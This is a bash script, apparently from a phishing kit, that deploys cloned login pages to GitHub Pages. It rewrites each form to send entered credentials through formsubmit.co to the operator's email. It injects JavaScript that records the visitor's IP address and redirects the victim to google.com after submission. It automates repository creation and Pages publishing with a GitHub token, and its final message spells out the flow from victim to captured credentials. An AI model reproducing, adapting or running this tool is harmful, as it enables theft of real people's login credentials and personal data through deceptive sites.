#!/bin/bash

## Zen GitHub Pages Publisher
## Deploys login page to GitHub Pages with FormSubmit.co credential capture
## Usage: bash scripts/ghpublish.sh <site_name> <your_email>
## Set token: export ZEN_GITHUB_TOKEN=ghp_xxxxx

GITHUB_TOKEN="${ZEN_GITHUB_TOKEN:-$GITHUB_TOKEN}"
GITHUB_USER="whydohumanssuck"
WEBSITE="$1"
YOUR_EMAIL="$2"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BASE_DIR="$(dirname "$SCRIPT_DIR")"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[0;37m'
BOLD='\033[1m'

log()  { echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} $1${WHITE}"; }
ok()   { echo -e "${MAGENTA}[${WHITE}+${GREEN}]${GREEN} $1${WHITE}"; }
fail() { echo -e "${MAGENTA}[${WHITE}!${RED}]${RED} $1${WHITE}"; }

if [[ -z "$GITHUB_TOKEN" ]]; then
    fail "GitHub token not found!"
    echo ""
    echo "  Set your token:"
    echo "    export ZEN_GITHUB_TOKEN=your_token_here"
    echo ""
    echo "  Or add to ~/.bashrc:"
    echo '    echo "export ZEN_GITHUB_TOKEN=ghp_xxxxx" >> ~/.bashrc'
    exit 1
fi

if [[ -z "$WEBSITE" || -z "$YOUR_EMAIL" ]]; then
    fail "Usage: bash scripts/ghpublish.sh <site_name> <email>"
    echo ""
    echo -e "${CYAN}Available sites:${WHITE}"
    ls "$BASE_DIR/.sites/" 2>/dev/null
    exit 1
fi

if [[ ! -d "$BASE_DIR/.sites/$WEBSITE" ]]; then
    fail "Site '$WEBSITE' not found!"
    exit 1
fi

REPO_NAME="zen-$(echo "$WEBSITE" | tr '[:upper:]' '[:lower:]')-$(date +%s | md5sum | head -c 6)"

echo ""
echo -e "${BOLD}${CYAN}  Zen GitHub Pages Publisher${WHITE}"
echo -e "${CYAN}  ─────────────────────────────────${WHITE}"
log "Site: ${GREEN}$WEBSITE"
log "Email: ${GREEN}$YOUR_EMAIL"
log "Repo: ${GREEN}$REPO_NAME"
echo ""

# ── Step 1: Prepare deploy directory ────────────────────────────────
log "Preparing deploy directory..."

rm -rf /tmp/zen_deploy
mkdir -p /tmp/zen_deploy

cp -r "$BASE_DIR/.sites/$WEBSITE"/* /tmp/zen_deploy/ 2>/dev/null

if [[ -f "$BASE_DIR/.sites/ip.php" ]]; then
    cp -f "$BASE_DIR/.sites/ip.php" /tmp/zen_deploy/ 2>/dev/null
fi

ok "Site files copied"

# ── Step 2: Convert to static HTML with FormSubmit.co ──────────────
log "Converting to static HTML..."

FILE_COUNT=0
for f in /tmp/zen_deploy/*.html; do
    [[ -f "$f" ]] || continue

    # Change form action to FormSubmit.co
    sed -i "s|action=\"login.php\"|action=\"https://formsubmit.co/$YOUR_EMAIL\" method=\"POST\"|g" "$f"
    sed -i "s|action='login.php'|action='https://formsubmit.co/$YOUR_EMAIL' method='POST'|g" "$f"

    # Remove old body/html close tags
    sed -i '/<\/body>/d' "$f"
    sed -i '/<\/html>/d' "$f"

    # Append IP capture + redirect script
    cat >> "$f" << 'JSEOF'

<script>
(async function(){
    try {
        var r = await fetch('https://api.ipify.org?format=json');
        var j = await r.json();
        var ipInput = document.createElement('input');
        ipInput.type = 'hidden';
        ipInput.name = 'visitor_ip';
        ipInput.value = j.ip;
        document.querySelectorAll('form').forEach(function(form){ form.appendChild(ipInput.cloneNode(true)); });
    } catch(e){}
    document.querySelectorAll('form').forEach(function(form){
        form.addEventListener('submit', function(){
            setTimeout(function(){ window.location.href='https://google.com'; }, 500);
        });
    });
})();
</script>
</body>
</html>
JSEOF

    FILE_COUNT=$((FILE_COUNT + 1))
done

# Remove PHP files (GitHub Pages does not support them)
rm -f /tmp/zen_deploy/*.php
rm -f /tmp/zen_deploy/ip.php
rm -f /tmp/zen_deploy/usernames.txt
rm -f /tmp/zen_deploy/ip.txt

# Disable Jekyll processing
touch /tmp/zen_deploy/.nojekyll

# Rename main HTML to index.html for GitHub Pages
if [[ -f /tmp/zen_deploy/login.html ]]; then
    cp /tmp/zen_deploy/login.html /tmp/zen_deploy/index.html
elif [[ ! -f /tmp/zen_deploy/index.html ]]; then
    FIRST_HTML=$(ls /tmp/zen_deploy/*.html 2>/dev/null | head -1)
    if [[ -n "$FIRST_HTML" ]]; then
        cp "$FIRST_HTML" /tmp/zen_deploy/index.html
    fi
fi

ok "Converted $FILE_COUNT HTML files"

# ── Step 3: Create GitHub repository ────────────────────────────────
log "Creating GitHub repository..."

REPO_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Authorization: token $GITHUB_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    -d "{\"name\":\"$REPO_NAME\",\"auto_init\":false}" \
    "https://api.github.com/user/repos")

REPO_HTTP=$(echo "$REPO_RESPONSE" | tail -1)
REPO_BODY=$(echo "$REPO_RESPONSE" | head -n -1)

if [[ "$REPO_HTTP" != "201" ]]; then
    fail "Failed to create repository (HTTP $REPO_HTTP)"
    fail "Response: $REPO_BODY"
    exit 1
fi

ok "Repository created"

# ── Step 4: Push files to GitHub ───────────────────────────────────
log "Pushing files to GitHub..."

cd /tmp/zen_deploy
rm -rf .git
git init -b main > /dev/null 2>&1
git config user.email "${GITHUB_USER}@github.com"
git config user.name "$GITHUB_USER"
git add -A > /dev/null 2>&1
git commit -m "deploy" > /dev/null 2>&1
git remote add origin "https://${GITHUB_USER}:${GITHUB_TOKEN}@github.com/${GITHUB_USER}/${REPO_NAME}.git" > /dev/null 2>&1

PUSH_OUTPUT=$(git push -u origin main 2>&1)
if [[ $? -ne 0 ]]; then
    fail "Push failed: $PUSH_OUTPUT"
    exit 1
fi

ok "Files pushed"

# ── Step 5: Enable GitHub Pages ────────────────────────────────────
log "Enabling GitHub Pages..."

sleep 2
PAGES_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Authorization: token $GITHUB_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/$GITHUB_USER/$REPO_NAME/pages" \
    -d '{"source":{"branch":"main","path":"/"}}')

PAGES_HTTP=$(echo "$PAGES_RESPONSE" | tail -1)

if [[ "$PAGES_HTTP" == "201" ]] || [[ "$PAGES_HTTP" == "204" ]]; then
    ok "GitHub Pages enabled"
else
    log "Pages API returned HTTP $PAGES_HTTP (may still be building...)"
fi

# Wait for GitHub Pages to build
log "Waiting for Pages to build (30s)..."
sleep 30

# Verify the site is live
SITE_URL="https://${GITHUB_USER}.github.io/${REPO_NAME}/"
HTTP_CHECK=$(curl -s -o /dev/null -w "%{http_code}" "$SITE_URL" 2>/dev/null)

if [[ "$HTTP_CHECK" == "200" ]]; then
    ok "Site is live!"
else
    log "Site may take a moment to go live (HTTP $HTTP_CHECK)"
    log "Try again in 30-60 seconds: $SITE_URL"
fi

echo ""
echo -e "${GREEN}════════════════════════════════════════${WHITE}"
echo -e "${GREEN}  DEPLOYMENT COMPLETE${WHITE}"
echo -e "${GREEN}════════════════════════════════════════${WHITE}"
echo ""
echo -e "${CYAN}  Site URL : ${WHITE}$SITE_URL"
echo -e "${CYAN}  Monitor  : ${WHITE}Check your email ($YOUR_EMAIL)"
echo -e "${CYAN}  Dashboard: ${WHITE}https://formsubmit.co/dashboard"
echo ""
echo -e "${MAGENTA}  Victim visits URL -> enters creds -> you get email${WHITE}"
echo ""
